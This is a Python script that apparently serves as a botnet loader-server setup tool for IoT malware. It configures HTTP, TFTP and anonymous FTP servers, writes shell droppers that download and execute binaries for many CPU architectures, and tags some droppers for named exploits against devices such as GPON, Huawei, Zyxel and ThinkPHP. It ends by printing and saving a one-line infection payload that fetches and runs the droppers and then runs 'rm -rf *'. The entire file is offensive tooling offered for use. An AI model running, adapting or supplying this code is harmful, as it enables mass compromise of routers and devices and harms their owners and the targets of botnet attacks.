import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "76d32be0"
exec_name = "payload"
bin_prefix = "db0fa4b8db0333367e9bda3ab68b8042."
bin_directory = "596a96cc7bf9108cd896f33c44aedc8a"
archs = ["x86",               #1
"mips",                       #2
"mpsl",                       #3
"arm",                       #4
"arm5",                       #5
"arm6",                       #6
"arm7",                       #7
"ppc",                        #8
"m68k",                       #9
"spc",                        #12
"i686",                       #13
"sh4",                        #12
"arc"]                       #11


def run(cmd):
    subprocess.call(cmd, shell=True)
print("\033[01;37mPlease wait while your payload generating.")
print(" ")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("Creating .sh Bins")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/76d32be0.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/76d32be0.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/76d32be0.sh')

run('echo "#!/bin/bash" > /var/lib/tftpboot/76d32be02.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/76d32be02.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/76d32be02.sh')

run('echo "#!/bin/bash" > /var/ftp/76d32be01.sh')
run('echo "ulimit -n 1024" >> /var/ftp/76d32be01.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/76d32be01.sh')

run('echo "#!/bin/bash" > /var/lib/tftpboot/jaws')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/jaws')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/jaws')

run('echo "#!/bin/bash" > /var/www/html/76d32be0.sh')
run('echo "#!/bin/bash" > /var/www/html/yarn')
run('echo "#!/bin/bash" > /var/www/html/hnap')
run('echo "#!/bin/bash" > /var/www/html/aws')
run('echo "#!/bin/bash" > /var/www/html/gpon443')
run('echo "#!/bin/bash" > /var/www/html/huawei')
run('echo "#!/bin/bash" > /var/www/html/zyxel')
run('echo "#!/bin/bash" > /var/www/html/zte')
run('echo "#!/bin/bash" > /var/www/html/realtek')
run('echo "#!/bin/bash" > /var/www/html/pulse')
run('echo "#!/bin/bash" > /var/www/html/lg')
run('echo "#!/bin/bash" > /var/www/html/goahead')
run('echo "#!/bin/bash" > /var/www/html/thinkphp')
run('echo "#!/bin/bash" > /var/www/html/jaws')

for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/www/html/76d32be0.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' aws.exploit" >> /var/www/html/aws')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' lg.exploit" >> /var/www/html/lg')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' jaws.exploit" >> /var/www/html/jaws')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' hnap.exploit" >> /var/www/html/hnap')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' pulse.exploit" >> /var/www/html/pulse')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' gpon443.exploit" >> /var/www/html/gpon443')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' thinkphp.exploit" >> /var/www/html/thinkphp')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' huawei.exploit" >> /var/www/html/huawei')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' zte.exploit" >> /var/www/html/zte')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' yarn.exploit" >> /var/www/html/yarn')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' zyxel.exploit" >> /var/www/html/zyxel')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' realtek.exploit" >> /var/www/html/realtek')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' goahead.exploit" >> /var/www/html/goahead')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/ftp/76d32be01.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/76d32be0.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + '; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/76d32be02.sh')    
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + '; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' jaws.exploit" >> /var/lib/tftpboot/jaws')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n999999; ulimit -u999999; ulimit -e999999" >> ~/.bashrc')
run
print("\x1b[0;31mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/76d32be0.sh; curl -O http://" + ip + "/76d32be0.sh; chmod 777 76d32be0.sh; sh 76d32be0.sh; tftp " + ip + " -c get 76d32be0.sh; chmod 777 76d32be0.sh; sh 76d32be0.sh; tftp -r 76d32be02.sh -g " + ip + "; chmod 777 76d32be02.sh; sh 76d32be02.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " 76d32be01.sh 76d32be01.sh; sh 76d32be01.sh; rm -rf 76d32be0.sh 76d32be0.sh 76d32be02.sh 76d32be01.sh; rm -rf *\x1b[0m")
print("")
complete_payload = ("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/76d32be0.sh; curl -O http://" + ip + "/76d32be0.sh; chmod 777 76d32be0.sh; sh 76d32be0.sh; tftp " + ip + " -c get 76d32be0.sh; chmod 777 76d32be0.sh; sh 76d32be0.sh; tftp -r 76d32be02.sh -g " + ip + "; chmod 777 76d32be02.sh; sh 76d32be02.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " 76d32be01.sh 76d32be01.sh; sh 76d32be01.sh; rm -rf 76d32be0.sh 76d32be0.sh 76d32be02.sh 76d32be01.sh; rm -rf *")
file = open("payload.txt","w+")
file.write(complete_payload)
file.close()
exit()
raw_input("\033[01;37mYour payload has been generated and saved in payload.txt\033[0m")
